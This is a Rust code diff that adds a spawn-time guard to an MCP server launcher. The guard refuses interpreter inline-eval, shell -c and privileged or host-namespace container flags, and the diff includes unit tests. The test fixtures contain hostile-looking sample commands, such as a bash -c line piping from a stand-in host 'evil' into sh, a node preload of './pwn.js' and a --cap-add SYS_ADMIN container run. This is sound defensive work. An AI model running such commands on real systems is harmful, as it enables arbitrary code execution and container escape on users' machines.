@@ -256,6 +256,103 @@ fn forward_line(
     tx.send(line).is_ok()
 }
 
+/// Spawn-time supply-chain guard. Conduit runs stdio servers as full-privilege
+/// host processes, so this is NOT a sandbox; it refuses the specific *smuggling*
+/// techniques where a benign-looking launcher (`node`, `docker`, `sh`) is turned
+/// into arbitrary code execution or a privileged container by its arguments. The
+/// threat is a booby-trapped server config the member did not author (a team-pushed
+/// or registry-imported entry) whose command reads as harmless but whose args
+/// inject code. High-precision by design: it only trips on interpreter inline-eval
+/// / module-preload flags and container-escape flags, none of which a normal
+/// `npx` / `uvx` / binary MCP server needs. Returns `Err(reason)` to block the
+/// spawn; the reason surfaces to the member.
+pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
+    let dangerous: Option<&str> = match command_basename(command).as_str() {
+        // Interpreters: inline-eval and module-preload execute attacker-supplied
+        // code without a script file on disk.
+        "node" | "nodejs" | "deno" | "bun" => {
+            first_flag(args, &["-e", "--eval", "-p", "--print", "-r", "--require", "--import"])
+        }
+        "python" | "python2" | "python3" | "pypy" | "pypy3" => first_flag(args, &["-c"]),
+        "ruby" => first_flag(args, &["-e"]),
+        "perl" => first_flag(args, &["-e"]),
+        "php" => first_flag(args, &["-r"]),
+        // Shells: `-c <string>` (or `/c` on Windows shells) runs an arbitrary line.
+        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" | "pwsh" | "powershell" => {
+            first_flag(args, &["-c", "-command", "/c", "/command"])
+        }
+        // Container runtimes: privileged mode, capability/device passthrough, and
+        // host-namespace sharing escalate past a normal host process (a plain `-v`
+        // mount does not, and stays allowed; see container_escape_flag).
+        "docker" | "podman" | "nerdctl" => container_escape_flag(args),
+        _ => None,
+    };
+    match dangerous {
+        Some(flag) => Err(format!(
+            "refusing to launch '{command}': the argument '{flag}' can execute \
+             arbitrary code or escape isolation. Conduit blocks inline-eval and \
+             privileged-container flags on spawned servers as a supply-chain guard. \
+             If this server is yours and you trust it, launch it from a script file \
+             or a wrapper binary instead of an inline command."
+        )),
+        None => Ok(()),
+    }
+}
+
+/// Lowercased final path segment without its extension, splitting on BOTH `/` and
+/// `\` on every OS. `std::path` only treats `\` as a separator on Windows, so a
+/// Windows-style path would slip this check on Linux/macOS; doing it by hand keeps
+/// the guard (and its tests) platform-independent. `C:\\tools\\Node.EXE` and
+/// `/usr/bin/node` both -> `node`.
+fn command_basename(command: &str) -> String {
+    let last = command.rsplit(['/', '\\']).next().unwrap_or(command);
+    // Strip a trailing extension (`.exe`, `.js`, ...) but keep dotless names intact.
+    let stem = last
+        .rsplit_once('.')
+        .map(|(s, _)| s)
+        .filter(|s| !s.is_empty())
+        .unwrap_or(last);
+    stem.to_ascii_lowercase()
+}
+
+/// The first arg (returned verbatim for the error) that case-insensitively equals
+/// one of `flags`, matching both `-flag` and the `--flag=value` long form.
+fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
+    args.iter().find(|a| {
+        let al = a.to_ascii_lowercase();
+        let head = al.split('=').next().unwrap_or(&al);
+        flags.iter().any(|f| head == *f)
+    }).map(|a| a.as_str())
+}
+
+/// Docker/Podman args that ESCALATE beyond what a normal host process already has:
+/// privileged mode, added capabilities, device passthrough, and host-namespace
+/// sharing. Plain host mounts (`-v` / `--volume` / `--mount`) are intentionally NOT
+/// blocked: Conduit already runs npx/uvx/binary servers with full host-filesystem
+/// access, so a docker volume mount is no more dangerous than the servers we run
+/// unrestricted, and blocking it would false-positive on legitimate dockerized MCP
+/// servers. Namespace flags (`--pid`, `--net`, ...) trip only when their value is
+/// `host`, in either `--pid=host` or `--pid host` form (so `--network mynet` is fine).
+fn container_escape_flag(args: &[String]) -> Option<&str> {
+    for (i, a) in args.iter().enumerate() {
+        let al = a.to_ascii_lowercase();
+        let head = al.split('=').next().unwrap_or(&al);
+        if matches!(head, "--privileged" | "--cap-add" | "--device") {
+            return Some(a.as_str());
+        }
+        if matches!(head, "--pid" | "--ipc" | "--uts" | "--net" | "--network" | "--userns") {
+            let val = al
+                .split_once('=')
+                .map(|(_, v)| v.to_string())
+                .or_else(|| args.get(i + 1).map(|v| v.to_ascii_lowercase()));
+            if val.as_deref() == Some("host") {
+                return Some(a.as_str());
+            }
+        }
+    }
+    None
+}
+
 /// Talks to a downstream MCP server over its stdio (a spawned child process).
 /// Stdout is drained on a background thread into a channel so reads can time out
 /// (a blocking `read_line` on an unresponsive child would otherwise hang forever).
@@ -304,6 +401,10 @@ impl StdioTransport {
         env: &[(String, String)],
         dirty: Option<Arc<AtomicBool>>,
     ) -> Result<Self, String> {
+        // Supply-chain guard: refuse code-smuggling / container-escape args before
+        // we hand the command to the OS. Applies to every spawn path (probe,
+        // playground, gateway) so a booby-trapped config never reaches a process.
+        screen_spawn_command(command, args)?;
         let resolved = resolve_command(command);
         let mut cmd = Command::new(&resolved);
         cmd.args(args)
@@ -793,11 +894,74 @@ fn extract_array(result: &Value, key: &str) -> Vec<Value> {
 
 #[cfg(test)]
 mod tests {
-    use super::resolve_command;
+    use super::{resolve_command, screen_spawn_command};
 
     #[test]
     fn paths_with_extension_pass_through() {
         assert_eq!(resolve_command("C:\\tools\\foo.exe"), "C:\\tools\\foo.exe");
+    }
+
+    fn argv(parts: &[&str]) -> Vec<String> {
+        parts.iter().map(|s| s.to_string()).collect()
+    }
+
+    #[test]
+    fn spawn_guard_allows_normal_mcp_launchers() {
+        // The overwhelmingly common launchers must never be blocked.
+        assert!(screen_spawn_command("npx", &argv(&["-y", "@some/mcp-server"])).is_ok());
+        assert!(screen_spawn_command("uvx", &argv(&["some-mcp-server"])).is_ok());
+        assert!(screen_spawn_command("node", &argv(&["server.js", "--port", "3000"])).is_ok());
+        assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
+        assert!(screen_spawn_command("python3", &argv(&["/opt/app/main.py"])).is_ok());
+        // A docker server without escape flags is fine.
+        assert!(screen_spawn_command("docker", &argv(&["run", "-i", "--rm", "ghcr.io/x/y"])).is_ok());
+        // Non-host docker network must NOT be a false positive.
+        assert!(screen_spawn_command("docker", &argv(&["run", "--network", "mynet", "img"])).is_ok());
+        // A plain binary server.
+        assert!(screen_spawn_command("/usr/local/bin/my-mcp", &argv(&["--stdio"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_blocks_interpreter_inline_eval() {
+        assert!(screen_spawn_command("node", &argv(&["-e", "require('child_process')"])).is_err());
+        assert!(screen_spawn_command("node", &argv(&["--eval", "x"])).is_err());
+        assert!(screen_spawn_command("node", &argv(&["--require", "./pwn.js", "server.js"])).is_err());
+        assert!(screen_spawn_command("node", &argv(&["--import=./pwn.js", "server.js"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["eval", "-e", "x"])).is_err());
+        assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
+        assert!(screen_spawn_command("ruby", &argv(&["-e", "x"])).is_err());
+        assert!(screen_spawn_command("bash", &argv(&["-c", "curl evil | sh"])).is_err());
+        assert!(screen_spawn_command("sh", &argv(&["-c", "x"])).is_err());
+        assert!(screen_spawn_command("pwsh", &argv(&["-Command", "x"])).is_err());
+    }
+
+    #[test]
+    fn spawn_guard_blocks_container_escape() {
+        // Privilege escalation beyond a normal host process is blocked.
+        assert!(screen_spawn_command("docker", &argv(&["run", "--privileged", "img"])).is_err());
+        assert!(screen_spawn_command("podman", &argv(&["run", "--cap-add", "SYS_ADMIN", "img"])).is_err());
+        assert!(screen_spawn_command("docker", &argv(&["run", "--device", "/dev/kmsg", "img"])).is_err());
+        // Host namespaces in both `=host` and space forms.
+        assert!(screen_spawn_command("docker", &argv(&["run", "--network=host", "img"])).is_err());
+        assert!(screen_spawn_command("docker", &argv(&["run", "--pid", "host", "img"])).is_err());
+    }
+
+    #[test]
+    fn spawn_guard_allows_docker_volume_mounts() {
+        // A plain host mount is NOT an escalation beyond the full host access npx/binary
+        // servers already have, so it must not false-positive on legit docker servers.
+        assert!(screen_spawn_command("docker", &argv(&["run", "-v", "/data:/data", "img"])).is_ok());
+        assert!(screen_spawn_command("docker", &argv(&["run", "--volume", "/data:/data", "img"])).is_ok());
+        assert!(screen_spawn_command("docker", &argv(&["run", "--mount", "type=bind,src=/data,dst=/d", "img"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_is_case_and_path_insensitive() {
+        // A full path and odd casing must still resolve to the interpreter name.
+        assert!(screen_spawn_command("/usr/bin/node", &argv(&["-e", "x"])).is_err());
+        assert!(screen_spawn_command("C:\\Program Files\\nodejs\\NODE.EXE", &argv(&["-E", "x"])).is_err());
+        // A non-interpreter that merely has a `-e`-looking arg is untouched.
+        assert!(screen_spawn_command("my-server", &argv(&["-e", "value"])).is_ok());
     }
 
     #[test]
